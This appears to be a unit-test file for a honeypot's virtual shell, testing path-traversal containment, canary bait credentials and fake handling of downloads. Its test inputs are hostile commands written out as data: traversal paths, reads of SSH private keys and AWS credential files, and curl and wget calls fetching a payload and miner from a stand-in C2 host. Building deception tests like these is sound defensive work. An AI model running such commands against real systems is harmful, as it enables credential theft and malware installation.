"""Unit tests for virtual filesystem, path traversal isolation, and canary baiting."""

from mirage_pot.vfs import VirtualShell


def test_vfs_path_traversal_safety():
    shell = VirtualShell("test_sess_01", username="root")

    # Try traversing above root
    out = shell.execute("cd ../../../../../../../../")
    assert shell.cwd == "/"

    # Try cat with traversal
    out = shell.execute("cat ../../../../../../../etc/hostname")
    assert "prod-srv-edge-01" in out


def test_vfs_file_creation_and_cat():
    shell = VirtualShell("test_sess_02", username="root")
    shell.execute("echo 'hello hacker' > /tmp/test.txt")
    out = shell.execute("cat /tmp/test.txt")
    assert out.strip() == "hello hacker"


def test_vfs_command_chaining():
    shell = VirtualShell("test_sess_03", username="root")
    out = shell.execute("echo 'step1' > /tmp/chain.txt && cat /tmp/chain.txt")
    assert "step1" in out


def test_canary_credentials_present():
    sess_id = "canary_sess_42"
    shell = VirtualShell(sess_id, username="root")

    env_content = shell.execute("cat /root/.env")
    assert "DATABASE_URL" in env_content
    assert "canary_db_" in env_content

    ssh_key = shell.execute("cat /root/.ssh/id_rsa")
    assert "BEGIN OPENSSH PRIVATE KEY" in ssh_key
    assert "canary-trap-session-" in ssh_key

    aws_creds = shell.execute("cat /root/.aws/credentials")
    assert "aws_access_key_id" in aws_creds
    assert "BAIT" in aws_creds


def test_fake_wget_curl_safe():
    shell = VirtualShell("test_sess_04", username="root")
    out = shell.execute("curl http://malicious.c2/drop.sh")
    assert "Mining initialized" in out
    assert "http://malicious.c2/drop.sh" in shell.downloaded_payloads

    wget_out = shell.execute("wget http://malicious.c2/miner")
    assert "saved" in wget_out
    assert "http://malicious.c2/miner" in shell.downloaded_payloads
